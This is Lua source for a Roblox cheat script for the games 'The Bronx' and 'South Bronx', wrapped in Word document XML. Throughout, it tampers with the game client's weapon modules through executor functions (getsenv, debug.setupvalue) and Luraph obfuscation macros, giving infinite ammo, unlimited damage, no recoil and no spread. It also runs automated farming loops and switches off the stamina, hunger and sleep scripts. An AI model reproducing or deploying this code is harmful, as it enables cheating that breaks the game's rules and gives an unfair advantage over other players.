        <w:t xml:space="preserve">                    task.cancel(CardFarm_Thread)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 Humanoid = LocalPlayer.Character:WaitForChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Humanoid.Died:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                tp_debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.CardFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_CardFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.BoxFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_BoxFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.ChipFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_ChipFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.MarshmallowFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_MarshmallowFarm()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LocalPlayer.CharacterAdded:Connect(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Humanoid = Character:WaitForChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                tp_debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.CardFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_CardFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Start_CardFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.BoxFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_BoxFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Start_BoxFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.ChipFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_ChipFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Start_ChipFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.FarmingUtilities.MarshmallowFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_MarshmallowFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Start_MarshmallowFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Humanoid.Died:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.FarmingUtilities.CardFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Stop_CardFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.FarmingUtilities.BoxFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Stop_BoxFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.FarmingUtilities.ChipFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Stop_ChipFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.FarmingUtilities.MarshmallowFarm then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Stop_MarshmallowFarm()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end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Workspace:FindFirstChild("PromptPurchases") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GunPosition = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in ReplicatedStorage.Workspace.PromptPurchases:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value:IsA("Model") and not Workspace:FindFirstChild("PromptPurchases"):FindFirstChild(Value.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Value.Parent = Workspace:FindFirstChild("PromptPurchases")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for Index, Value in Workspace.PromptPurchases:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:FindFirstChild("Price") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:FindFirstChild("proxprompt") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:FindFirstChild("proxprompt"):FindFirstChildOfClass("ProximityPrompt") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local GunWithPrice = string.format("%s - $%s", tostring(Value), tostring(Value.Price.Value))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not table.find(Config.South_Bronx.Guns, GunWithPrice) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(Config.South_Bronx.Guns, GunWithPrice)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        GunPosition[Value.Name] = Value.proxprompt.CFrame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table.sort(Config.South_Bronx.Guns)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if Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RequireSupport = type(select(2, pcall(require, Services.ReplicatedStorage.BlacklistedMarketTools))) == "table"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Game_Name == "The Bronx" and RequireSupport then                                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local OldWeaponValues = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local GetAllTools = LPH_NO_VIRTUALIZE(function(LocalToolsOnly)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Result = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Value in next, {not LocalToolsOnly and Lighting, LocalPlayer.Backpack, LocalPlayer.Character ~= nil and LocalPlayer.Character} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if type(Value) == "userdata" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for _, _Value in next, Value:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --if _Value.Name == "TP9EliteTan" then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Result[#Result + 1] = _Value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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local GetPercentage = LPH_NO_VIRTUALIZE(function(DefaultValue, NewValue)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                NewValue = math.max(0, math.min(100, NewValue))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local newRecoil = DefaultValue * (NewValue / 100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return newRecoil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ModWeapon = LPH_JIT_MAX(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Module = Weapon:FindFirstChildOfClass("ModuleScript")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local OldConfig = OldWeaponValues[Weapon.Name]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Module and Module.Name == "Setting" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Module = require(Module)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else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SetInfiniteAmmo == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetInfiniteAmmo = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if SetInfiniteClips == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetInfiniteClips = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Config.TheBronx._Modifications.InfiniteClips then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    debug.setupvalue(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        getsenv(Weapon:FindFirstChild("GunScript_Local")).Reload,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        3,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        10000 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    SetInfiniteClips = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Config.TheBronx._Modifications.InfiniteClips == false and SetInfiniteClips == true then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    debug.setupvalue(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        getsenv(Weapon:FindFirstChild("GunScript_Local")).Reload,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        3,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        OldConfig.AmmoPerMag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    SetInfiniteClips = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx._Modifications.InfiniteAmmo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    debug.setupvalue(getsenv(Weapon:FindFirstChild("GunScript_Local")).Reload, 1, Config.TheBronx._Modifications.InfiniteAmmo and 1e1 or OldConfig.AmmoPerMag / 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetInfiniteAmmo = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx._Modifications.InfiniteAmmo == false and SetInfiniteAmmo == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    debug.setupvalue(getsenv(Weapon:FindFirstChild("GunScript_Local")).Reload, 1, OldConfig.AmmoPerMag)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetInfiniteAmmo = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.LimitedAmmoEnabled = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.FireRate = Config.TheBronx._Modifications.ModifyFireRate and GetPercentage(OldConfig.FireRate, Config.TheBronx._Modifications.FireRateSpeed) or OldConfig.FireRate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.ReloadTime = Config.TheBronx._Modifications.ModifyReloadSpeed and GetPercentage(OldConfig.ReloadTime, Config.TheBronx._Modifications.ReloadSpeed) or OldConfig.ReloadTime</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Module.SpreadXY then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Module.SpreadXY = Config.TheBronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.SpreadXY, Config.TheBronx._Modifications.SpreadPercentage) or OldConfig.SpreadXY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Module.SpreadYX then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Module.SpreadYX = Config.TheBronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.SpreadYX, Config.TheBronx._Modifications.SpreadPercentage) or OldConfig.SpreadYX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Module.Spread then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Module.Spread = Config.TheBronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.Spread, Config.TheBronx._Modifications.SpreadPercentage) or OldConfig.Spread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.SpreadX = Config.TheBronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.SpreadX, Config.TheBronx._Modifications.SpreadPercentage) or OldConfig.SpreadX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.SpreadY = Config.TheBronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.SpreadY, Config.TheBronx._Modifications.SpreadPercentage) or OldConfig.SpreadY</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.Recoil = Config.TheBronx._Modifications.ModifyRecoilValue and GetPercentage(OldConfig.Recoil, Config.TheBronx._Modifications.RecoilPercentage) or OldConfig.Recoil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.BaseDamage = Config.TheBronx._Modifications.InfiniteDamage and math.huge or OldConfig.BaseDamage</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.Auto = Config.TheBronx._Modifications.Automatic or OldConfig.Auto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.JamChance = Config.TheBronx._Modifications.DisableJamming and 0 or OldConfig.JamChance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.Auto = Config.TheBronx._Modifications.Automatic or OldConfig.Auto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.EquipTime = Config.TheBronx._Modifications.ModifyEquipSpeed and GetPercentage(OldConfig.EquipTime, Config.TheBronx._Modifications.EquipSpeed) or OldConfig.EquipTime</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Module.JamChance = Config.TheBronx._Modifications.NoJam and 0 or OldConfig.JamChance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ModWeapons = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Weapon in next, GetAllTools(true) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Weapon:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ModWeapon(Weapon)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local SetValues = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Weapon in next, GetAllTools() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Weapon:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Module = Weapon:FindFirstChildOfClass("ModuleScript")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Module and Module.Name == "Setting" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Module = require(Module)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if type(Module) == "table" and not OldWeaponValues[Weapon.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            OldWeaponValues[Weapon.Name] = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local OldConfig = OldWeaponValues[Weapon.Name]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in next, Module do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                OldConfig[Index] = Value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if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.Character.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Value:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SetValues()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ModWeapon(Value);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.Backpack.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Value:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SetValues()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ModWeapon(Value);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Connect(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Character.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetValues()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ModWeapon(Value);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Backpack.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetValues()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ModWeapon(Value);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ConfigMetatable = getmetatable(Config.TheBronx.Modifications)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ConfigMetatable.__index = LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Config.TheBronx._Modifications[select(2, ...)]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ConfigMetatable.__newindex = LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Index, Value = select(2, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Config.TheBronx._Modifications[Index] = Value; ModWeapons()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.PlayerGui:FindFirstChild("Run") and LocalPlayer.PlayerGui.Run:FindFirstChild("StaminaBarScript", true) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui.Run:FindFirstChild("StaminaBarScript", true).Disabled = Config.TheBronx.PlayerModifications.InfiniteStamina</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.PlayerGui:FindFirstChild("Hunger") and LocalPlayer.PlayerGui.Hunger:FindFirstChild("HungerBarScript", true) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui.Hunger:FindFirstChild("HungerBarScript", true).Disabled = Config.TheBronx.PlayerModifications.InfiniteHunger</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.PlayerGui:FindFirstChild("SleepGui") and LocalPlayer.PlayerGui.SleepGui:FindFirstChild("sleepScript", true) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui.SleepGui:FindFirstChild("sleepScript", true).Disabled = Config.TheBronx.PlayerModifications.InfiniteSleep</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
